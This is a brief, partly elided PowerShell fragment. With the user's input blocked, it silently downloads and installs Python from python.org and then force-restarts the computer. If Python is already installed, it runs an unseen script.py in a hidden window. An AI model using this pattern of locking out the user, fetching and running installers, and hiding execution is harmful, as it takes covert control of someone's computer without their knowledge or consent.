...
function DisableUserInputAndRunScript() {
    ...
    try {
        ...
        $p = &{python -V} 2>&1
        $version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe";
        Start-Process "Python-Install.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait; Remove-Item "Python-Install.exe"; $userInput::BlockInput($false); Restart-Computer} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }
    } finally {
